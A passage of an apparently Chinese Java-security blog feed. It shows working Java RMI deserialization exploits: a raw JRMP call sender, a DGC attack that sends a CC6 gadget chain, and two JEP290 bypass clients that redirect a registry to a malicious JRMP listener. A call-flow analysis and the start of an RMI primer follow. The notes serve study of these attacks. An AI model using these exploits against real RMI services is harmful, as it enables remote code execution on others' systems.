class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.MarshalOutputStream;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.TransportConstants;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendRawCall</span><span class="params">(String host, <span class="type">int</span> port, ObjID objid, <span class="type">int</span> opNum, Long hash, Object ...objects)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> SocketFactory.getDefault().createSocket(host, port);</span><br><span class="line">        socket.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">        socket.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">            dos.writeInt(TransportConstants.Magic);</span><br><span class="line">            dos.writeShort(TransportConstants.Version);</span><br><span class="line">            dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">            dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line"></span><br><span class="line">            objid.write(objOut); <span class="comment">//Objid</span></span><br><span class="line">            objOut.writeInt(opNum); <span class="comment">// opnum</span></span><br><span class="line">            objOut.writeLong(hash); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Object object:</span><br><span class="line">                    objects) &#123;</span><br><span class="line">                objOut.writeObject(object);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            os.flush();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (dos != <span class="literal">null</span>) &#123;</span><br><span class="line">                dos.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AttackByDGC</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPocObject(<span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">2</span>);</span><br><span class="line">        RemoteUtils.sendRawCall(registryHost, registryPort,  objID, <span class="number">0</span>, -<span class="number">669196253586618813L</span>,payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        AttackByDGC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体调用调试流程可以参考：<a href="https://xz.aliyun.com/t/7930?time__1311=n4%2BxnD0DyDu730KK40Hpn7DOn%3Di%3Di3eH4D#toc-10">https://xz.aliyun.com/t/7930?time__1311=n4%2BxnD0DyDu730KK40Hpn7DOn%3Di%3Di3eH4D#toc-10</a></p><h3 id="JEP290-Bypass">JEP290 Bypass</h3><h4 id="jdk版本-231">jdk版本&lt;231</h4><p>受害服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">iRemoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRemoteObjImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;RmiDemo&quot;</span>,iRemoteObj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jepbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>); <span class="comment">// rmi start at 2222</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2222</span>); <span class="comment">// JRMPListener&#x27;s port is 2222</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(jepbypass.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="string">&quot;Hello&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意注册端</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733287787443-037c5f5f-3c13-4bc3-9bb1-e1339117823f.png" alt=""></p><p>这里来分析执行流程，和之前一样也是会走到dispatch方法里，中间过程就不细跟了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733287890594-bc4c8fbb-cdbf-4607-9d56-f1d41d7b934d.png" alt=""></p><ol><li>在 RegistryImpl_Skel.dispatch bind 分支反序列化参数时，最终会进入 RemoteObject.readObject 方法进行反序列化。</li><li>RemoteObject.readObject 方法中会调用 readExternal 方法。</li><li>而 readExternal 方法最终调用到 LiveRef 类的 read 方法。进而调用 saveRef 将远程对象的 LiveRef（标识信息、通信地址）存放在 ConnectionInputStream 实例中。</li></ol><p>这里在记录下过程</p><p>在dispatch反序列化之后会调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306495933-d195fc0c-6e1c-4cda-8292-2c91b4d0d3b2.png" alt=""></p><p>之后调用registerRefs()跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306521398-862bf0a8-2906-4735-a759-4dbd7fb92ced.png" alt=""></p><p>在这里就会发现会根据之前存储的映射关系（”在这个方法中会读出序列化流中的 host 和端口信息（就是恶意 JRMP 服务的 host 与端口，后面会提到），然后重新封装成一个 LiveRef 对象，将其存储到当前的 ConnectionInputStream 上。然后传入 DGCClient#registerRefs 方法中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306665162-4ce18445-7ddd-4e01-84b3-5e694198ff7f.png" alt=""></p><p>最终由 DGCClient 向恶意的 JRMP 服务端发起 lookup 连接：</p><p>后面就是恶意注册端将序列化数据传来，dgc客户端进行反序列化触发。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306988024-667efd9d-8df9-4874-86b6-1c86fd7ab48b.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733307041945-a0ac576d-e180-46fa-83e0-b75b84ab760e.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733307029512-b708840c-a739-41f5-9452-d1d0b846994c.png" alt=""></p><p>调用栈拿过来</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306872312-1e9b050e-619f-4c8d-b36f-d245e9314d84.png" alt=""></p><h4 id="231-jdk-241">231 =&lt; jdk &lt;= 241</h4><p>这里为什么不能用了是因为在 8u231 版本及以上的 DGCImpl_Stub#dirty 方法中多了一个 setObjectInputFilter 的过程，又会被 JEP290 check 到了 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">        var5.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</span><br></pre></td></tr></table></figure><p>An Trinh 提出了一种绕过方式，直接通过反序列化 UnicastRemoteObject 类来发起 JRMI Call 而不需要经过 DGCImpl_Stub.dirty 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jepbypass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">payload</span> <span class="operator">=</span> getPayload();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        bindReflection(<span class="string">&quot;pwn&quot;</span>, payload, registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> UnicastRemoteObject <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2223</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                handler.getClass().getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Constructor&lt;UnicastRemoteObject&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">unicastRemoteObject</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field_ssf</span> <span class="operator">=</span> UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;ssf&quot;</span>);</span><br><span class="line">        field_ssf.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field_ssf.set(unicastRemoteObject, factory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> unicastRemoteObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bindReflection</span><span class="params">(String name, Object obj, Registry registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ref_filed</span> <span class="operator">=</span> RemoteObject.class.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        ref_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) ref_filed.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">operations_filed</span> <span class="operator">=</span> RegistryImpl_Stub.class.getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operations_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) operations_filed.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">remoteCall</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">0</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">outputStream</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableReplace_filed</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;enableReplace&quot;</span>);</span><br><span class="line">        enableReplace_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        enableReplace_filed.setBoolean(outputStream, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        outputStream.writeObject(name);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        ref.invoke(remoteCall);</span><br><span class="line">        ref.done(remoteCall);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是抄的别的师傅的具体为啥这么写可以见参考的文章</p><p>然后来跟踪一下具体调用流程</p><p>参考：<a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p><p><a href="https://dummykitty.github.io/java/2023/06/26/Java-RMI-%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html">https://dummykitty.github.io/java/2023/06/26/Java-RMI-%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html</a></p><p><a href="https://www.anquanke.com/post/id/259059#h2-3">https://www.anquanke.com/post/id/259059#h2-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;RMI原理&quot;&gt;RMI原理&lt;/h2&gt;
&lt;p&gt;这部分已经记录过了也参考了许多佬的文章可以直接看自己的笔记&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/zqiangweihuakai/ybltae/yk0fv5pk1ssnkqxr&quot;&gt;Ja</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Java基础" scheme="https://oceanzbz.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="RMI" scheme="https://oceanzbz.github.io/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>RMI原理</title>
    <link href="https://oceanzbz.github.io/post/aded85d2.html"/>
    <id>https://oceanzbz.github.io/post/aded85d2.html</id>
    <published>2024-12-30T03:37:47.000Z</published>
    <updated>2025-03-05T07:24:36.795Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-简介">1.简介</h2><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。接口的两种常见实现方式是：最初使用JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现；此外还可以用与CORBA兼容的方法实现。RMI一般指的是编程接口，也有时候同时包括JRMP和API（应用程序编程接口），而RMI-IIOP则一般指RMI接口接管绝大部分的功能，以支持CORBA的实现。最初的RMI API设计为通用地支持不同形式的接口实现。后来，CORBA增加了传值（pass by value）功能，以实现RMI接口。然而RMI-IIOP和JRMP实现的接口并不完全一致。</p><h2 id="2原理：">2原理：</h2><p>架构图：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713594534904-494121f5-4244-4ca4-b11a-f34785779123.png" alt=""></p><p><code>RMI</code>底层通讯采用了<code>Stub(运行在客户端)</code>和<code>Skeleton(运行在服务端)</code>机制，<code>RMI</code>调用远程方法的大致如下：</p><ol><li><code>RMI客户端</code>在调用远程方法时会先创建<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>。</li><li><code>Stub</code>会将<code>Remote</code>对象传递给<code>远程引用层(java.rmi.server.RemoteRef)</code>并创建<code>java.rmi.server.RemoteCall(远程调用)</code>对象。</li><li><code>RemoteCall</code>序列化<code>RMI服务名称</code>、<code>Remote</code>对象。</li><li><code>RMI客户端</code>的<code>远程引用层</code>传输<code>RemoteCall</code>序列化后的请求信息通过<code>Socket</code>连接的方式传输到<code>RMI服务端</code>的<code>远程引用层</code>。</li><li><code>RMI服务端</code>的<code>远程引用层(sun.rmi.server.UnicastServerRef)</code>收到请求会请求传递给<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>。</li><li><code>Skeleton</code>调用<code>RemoteCall</code>反序列化<code>RMI客户端</code>传过来的序列化。</li><li><code>Skeleton</code>处理客户端请求：<code>bind</code>、<code>list</code>、<code>lookup</code>、<code>rebind</code>、<code>unbind</code>，如果是<code>lookup</code>则查找<code>RMI服务名</code>绑定的接口对象，序列化该对象并通过<code>RemoteCall</code>传输到客户端。</li><li><code>RMI客户端</code>反序列化服务端结果，获取远程对象的引用。</li><li><code>RMI客户端</code>调用远程方法，<code>RMI服务端</code>反射调用<code>RMI服务实现类</code>的对应方法并序列化执行结果返回给客户端。</li><li><code>RMI客户端</code>反序列化<code>RMI</code>远程方法调用结果。</li></ol><p>参考：<a href="https://www.javasec.org/javase/RMI/">https://www.javasec.org/javase/RMI/</a></p><h2 id="3代码示例">3代码示例</h2><p>服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">8989</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">RMI_PATH</span> <span class="operator">=</span> <span class="string">&quot;/test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_NAME</span> <span class="operator">=</span> <span 